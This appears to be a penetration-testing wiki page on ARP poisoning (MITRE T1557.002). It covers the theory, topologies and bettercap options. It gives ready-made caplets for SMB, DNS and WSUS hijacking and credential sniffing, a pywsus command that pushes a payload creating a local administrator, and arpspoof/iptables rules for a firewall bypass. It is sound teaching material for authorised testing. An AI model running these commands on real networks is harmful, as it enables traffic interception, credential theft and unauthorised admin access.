---
description: MITRE ATT&CK™ Sub-technique T1557.002
---

# ARP poisoning

## Theory

The ARP (Address Resolution Protocol) is used to link IPv4 addresses with MAC addresses, allowing machines to communicate within networks. Since that protocol works in broadcast, attackers can try to impersonate machines by answering ARP requests (_"Who is using address 192.168.56.1? I am!"_) or by flooding the network with ARP announcements (_"Hey everyone, nobody asked but I'm the one using address 192.168.56.1"_). This is called ARP spoofing (also called ARP poisoning).

{% hint style="info" %}
ARP Reply is accepted by a host without any verification, even if it didn’t send an ARP request ! (for performance purpose). The ARP table is being updated if the reply is different from the actual entry.
{% endhint %}

### Proxy vs. Rerouting

The two major use cases of ARP spoofing are the following.

1. **Proxy**: intercepting, forwarding and snooping or tampering with packets exchanged between a client and a server. This technique usually implies that the attacker has to poison the client's ARP table and replace the server's MAC address in it by its own, but also the server's ARP table (or the gateway's depending on the [network topology](arp-poisoning.md#network-topology)) to replace the client's MAC address in it by its own. Outgoing and incoming packets then get intercepted and can be tampered with or spied on.
2. **Rerouting**: Intercepting a set of packets sent by a client to a server and forwarding them to an evil server. This technique implies that the attacker only has to poison the client's ARP table and replace the server's MAC address in it by its own. The attacker then has to have an evil server capable of behaving like the spoofed one.

### Attack scenarios

There are multiple scenarios where ARP spoofing can be used to operate lateral movement within Active Directory domains (not an comprehensive list).

1. [NTLM capture](../ntlm/capture.md) and [NTLM relay](../ntlm/relay.md) : spoof an SMB server and reroute received SMB packets to internal capture or relay servers **(rerouting technique)**.
2. [DNS spoofing](dns-spoofing.md) : spoof an internal DNS server, so that DNS queries can be answered with fake resolutions **(rerouting technique)**.
3. [WSUS spoofing](wsus-spoofing.md) : spoof the WSUS server and deliver evil configurations to Windows clients. This can either be done by intercepting all update request and running a fully functional WSUS server **(rerouting technique)** or by intercepting, forwarding and tampering packets between clients and the legitimate WSUS server **(proxy technique)**.&#x20;
4. [Dumping network secrets](../credentials/dumping/network-protocols.md) : reroute any traffic and dump secrets that were insecurely sent (i.e. FTP, HTTP,  SMTP, ...). In this scenario, both outgoing and incoming traffic should be captured. This implies the poisoning of both the client's and the server's ARP tables **(proxy technique)**.

### Network topology

Besides the scenarios mentioned above, many network topologies exist and ARP poisoning attacks need to be carefully prepared based on that topology. Below are some common examples.

1. **One segment**: the client, the server, and the attacker are on the same network segment. The ARP tables can be poisoned with the attacker spoofing either the client or the server.
2. **Two segments**: the client and the attacker are on the same network segment but the server is on another one. For a hijacking attack, the client's ARP table can be poisoned with the attacker posing as the client's gateway. For a relaying attack, the gateway's ARP table also has to be poisoned with the attacker posing as the client.&#x20;
3. **Three segments**: all three machines are on different network segments. For both hijacking and relaying attacks, I'm not sure what can be done... :man\_shrugging:&#x20;

## Practice

{% hint style="danger" %}
Since spoofing every address in a subnet can cause temporary but severe disruption in that subnet, it is highly recommended to target specific addresses and machines while doing ARP spoofing.
{% endhint %}

The best tool to operate ARP poisoning is [bettercap](https://www.bettercap.org/) (Go) and for the majority of the scenarios, basic knowledge of the iptables utility is required.

### Networking

In order to forward packets, the system has to be prepared accordingly. The first step is to make sure the system firewall can effectively forward packets. The easiest way of achieving this is to write an `ACCEPT` policy in the `FORWARD` chain.

```bash
iptables --policy FORWARD ACCEPT
```

### ARP poisoning

Bettercap's [arp.spoof](https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/) module has multiple options that allow multiple scenarios

* `arp.spoof.targets` is the list of targets whose ARP tables will be poisoned
* `arp.spoof.internal` is an option that allows bettercap to choose which addresses to spoof. If set to `true`, machines from the same subnet as the client victim will be spoofed (i.e. their IP addresses will be matched to the attacker's MAC address on the victim client's ARP table). To put it simply, this option needs to be set to `true` when the attacker wants to be the man-in-the-middle between two machines of a same subnet. When the victim client and the spoofed server are on different subnets, this option can be left to `false`.
* `arp.spoof.fullduplex` is an option that, when set to `true`, will make bettercap automatically try to poison the gateway's ARP table so that packets aimed at the victim client also get intercepted.
* `arp.spoof` is a trigger to set to `on` when starting the ARP poisoning, `off` when stopping it. This trigger will also enable packets forwarding (i.e. write `1` in `/proc/sys/net/ip/ip_forward`) while the `arp.ban` trigger will disabled that and the poisoned victim will not have access to the spoofed machines anymore.

### Packet forwarding

Bettercap also has the [any.proxy](https://www.bettercap.org/modules/ethernet/proxies/any.proxy/) module that has multiple options to allows multiple scenarios

* `any.proxy.iface` allows to set the interface to redirect packets from
* `any.proxy.protocol` can be set to `UDP` or `TCP` to specify on which transport protocol the packets to reroute will transit&#x20;
* `any.proxy.src_address` refers to the destination address of the packets to reroute. This usually has to be set to the spoofed server IP address. Packets that were originally sent to that server will be rerouted and sent to another one. This option has to be set when doing the rerouting technique.This option can be blank. Bettercap will then reroute every packet received without filtering on the address. For instance, this is useful when doing a WSUS or DNS spoofing attack on multiple victims at the same time.
* `any.proxy.src_port` refers to the destination port of the packets to reroute. This usally has to be set to the spoofed service port. Packets that were originally sent to that server will be rerouted and sent to another one. This option has to be set when doing the rerouting technique.
* `any.proxy.dst_address` refers to the IP address the matched packets are to be sent to. For instance, when doing WSUS or DNS spoofing attacks in a rerouting technique mode, this option has to be set to the IP address of the attacker's server.
* `any.proxy.dst_port` refers to the port the matched packets are to be sent to.

### 🛠️ Bettercap logging

Bettercap's logging can be controlled so that only essential information is shown. Becoming a man-in-the-middle can be a little overwhelming when not filtering the info shown to the user.

* events.ignore TODOOOOO //

### 🛠️ Tips & tricks

* wireshark, make sure forwarded packets appear twice, one with MAC 1 -> MAC 2, one with MAC 2 -> MAC 3 (1=victim, 2=attacker, 3=gateway)
* Make sure the attacker and the victim client are on the same subnet, I don't know how to operate when they are not
* tracert on the client to make sure packets are forwarded if possible
* make sure it's not the DNS
* make sure the iptables rules are ok and allow forwarding --> [networking](arp-poisoning.md#networking)
* make sure to run bettercap in a privileged container with network host
* options can be written in a `.cap` file and launched with bettercap with the following command and options`bettercap --iface $interface --caplet caplet.cap`

## Scenarios examples

Below are examples or targeted ARP poisoning attacks where the attacker wants to hijack packets aimed at a specific server (SMB, DNS, WSUS, ...), to answer with evil responses. The "dumping network secrets" scenario is the one attackers use to [dump credentials on the network](../credentials/dumping/network-protocols.md) (usually in order to find an initial foothold).

{% tabs %}
{% tab title="SMB spoofing" %}
Start the SMB server for [capture](../ntlm/capture.md) or [relay](../ntlm/relay.md) then start the poisoning attack.

{% code title="smb_spoofing.cap" %}
```bash
# quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the original SMB server
set any.proxy.iface $interface
set any.proxy.protocol TCP
set any.proxy.src_address $SMB_server_ip
set any.proxy.src_port 445
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 445

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
any.proxy on
arp.spoof on
net.sniff on
```
{% endcode %}
{% endtab %}

{% tab title="DNS spoofing" %}
Start the DNS server ([responder](https://github.com/lgandx/Responder), [dnschef](https://github.com/iphelix/dnschef), or [bettercap](https://github.com/bettercap/bettercap)) for [DNS poisoning](dns-spoofing.md) then start the ARP poisoning attack.

{% code title="dns_spoofing.cap" %}
```bash
# quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the original DNS server
set any.proxy.iface $interface
set any.proxy.protocol UDP
set any.proxy.src_address $DNS_server_ip
set any.proxy.src_port 53
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 53

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
any.proxy on
arp.spoof on
net.sniff on
```
{% endcode %}
{% endtab %}

{% tab title="WSUS spoofing" %}
ARP poisoning for [WSUS spoofing ](wsus-spoofing.md)in a two-subnets layout (attacker + client in the same segment, legitimate WSUS server in another one). Packets from the client to the WSUS server need to be hijacked and sent to the attacker's evil WSUS server. In order to do so, the attacker must pose as the client's gateway, route all traffic to the real gateway except the packets destined to the WSUS server.

The evil WSUS server needs to be started before doing ARP poisoning. The [pywsus ](https://github.com/GoSecure/pywsus)(Python) utility can be used for that matter.

```bash
python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser /add && net localgroup Administrators testuser /add"'
```

Once the WSUS server is up and running, the ARP poisoning attack can start.

{% code title="wsus_spoofing.cap" %}
```bash
# quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the WSUS server
set any.proxy.iface $interface
set any.proxy.protocol TCP
set any.proxy.src_address $WSUS_server_ip
set any.proxy.src_port 8530
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 8530

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
any.proxy on
arp.spoof on
net.sniff on
```
{% endcode %}

The caplet above can be loaded with the following command in order to launch the ARP poisoning attack.

```bash
bettercap --iface $interface --caplet wsus_spoofing.cap
```

The search for Windows updates can be manually triggered when having access to the target computer by going to `Settings > Update & Security > Windows Update > Check for updates`.
{% endtab %}

{% tab title="Dumping network secrets" %}
Start [PCredz](https://github.com/lgandx/PCredz) or Wireshark then start the poisoning attack

{% code title="spoofing.cap" %}
```bash
# quick recon of the network
net.probe on

# set the ARP poisoning
set arp.spoof.targets $client_ip
set arp.spoof.internal true
set arp.spoof.fullduplex true

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
arp.spoof on
net.sniff on
```
{% endcode %}
{% endtab %}
{% endtabs %}

<details>

<summary>Alternative using <code>arpspoof</code> tool - Firewall Bypass scenario</summary>

#### Combining ARP poisoning and IP spoofing to bypass firewall

The goal of this attack is to bypass the firewall protecting a sensitive network and be able the access an asset there.&#x20;

To do so, the attacker's machine sits as MITM between the DNS server (referred to as the target of the ARP Spoofing, which is authorized to communicate with the sensitive asset in the protected network), and the firewall controlling the access to the protected network.\
In addition to this, the attacker spoofs the IP address of the DNS server when communicating with the sensitive asset and tags its traffic through dynamic ports to be able to track it and handle the response to its spoofed requests.&#x20;

Below is a diagram to visualize the attack:

<img src="../../../.gitbook/assets/arpspoofandipspoof.png" alt="Bypass WAF through ARP spoofing and IP Spoofing - attack diagram" data-size="original">

**IP spoofing**&#x20;

This part is done using [iptables](https://www.djack.com.pl/Suse9hlp/ch26s03.html) NAT rules.

<pre class="language-bash"><code class="lang-bash"># As refered to above, IP forwarding need to be enabled otherwise attacker's machine will drop the packets not containing its IP address as destination
<strong>sysctl net.ipv4.ip_forward=1
</strong># Change the source port range of the attacker host, this is only to make sure port range size is the same as the one of the spoofed traffic (20000-30000)
<strong>echo "40000 50000" > /proc/sys/net/ipv4/ip_local_port_range 
</strong># Spoof the source IP address of the outgoing traffic and modify the source ports to tag the spoofed traffic.
<strong>iptables -t nat -A POSTROUTING -s "ATTACKER_IP"/32 -o "NETWORK_INTERFACE" -p tcp -j SNAT --to-source "TARGET_IP":20000-30000
</strong># Identify the response to the spoofed traffic and change destination IP of the target to the one of the attacker's host
<strong>iptables -t nat -A PREROUTING -d "TARGET_IP"/32 -i "NETWORK_INTERFACE" -p tcp -m tcp --dport 20000:30000 -j DNAT --to-destination "ATTACKER_IP":40000-50000
</strong></code></pre>

**ARP spoofing (MITM)**\
To perform the ARP spoofing part, [arpspoof](https://github.com/ickerwx/arpspoof) (python2) is used. Both the DNS server and the firewall are poisoned ([proxy mode](arp-poisoning.md#proxy-vs.-rerouting)).&#x20;

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Launch the ARP poisoning
<strong>arpspoof -i "NETWORK_INTERFACE" -t "TARGET_IP" -r "FIREWALL_IP"
</strong></code></pre>

For more details about the attack, refer to the ["Combining ARP poisoning and IP spoofing to bypass firewalls" article](https://idafchev.github.io/pentest/2019/10/28/combining\_arp\_poisoning\_and\_ip\_spoofing\_to\_bypass\_firewalls.html) written by [Llia Dafchev](https://twitter.com/IliyaDafchev).

_**Nota bene:**_ there are different ways of populating the NAT table regarding outgoing traffic IP translation; through the `POSTROUTING` chain, applied on all outgoing packets:

1. `MASQUERADE`_:_ this will indicate that the source IP of outgoing packets should be changed to the one of the network interface specified in `-o` argument.

{% code overflow="wrap" %}
```bash
iptables -t nat -A POSTROUTING -o "NETWORK_INTERFACE" -j MASQUERADE
```
{% endcode %}

2. `SNAT`_:_ this will indicate that the source IP of outgoing packets should be changed to the one specified in `--to` argument. Below is an example different from the one used in the attack descried above, where decision on the NAT rule to apply is based on destination (`-d` option) rather than the source (`-s` option).

{% code overflow="wrap" %}
```bash
iptables -t nat -I POSTROUTING -d "TARGET_IP"  -j SNAT --to "MODIFIED_SOURCE_IP"
```
{% endcode %}

</details>

## Resources

{% embed url="http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html" %}

{% embed url="https://luemmelsec.github.io/Relaying-101/#arp-spoofing" %}

{% embed url="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/" %}

{% embed url="https://ivanitlearning.wordpress.com/2019/04/07/arp-dns-poisoning-with-bettercap-and-impacket-ntlmrelayx/" %}

{% embed url="https://idafchev.github.io/pentest/2019/10/28/combining_arp_poisoning_and_ip_spoofing_to_bypass_firewalls.html" %}
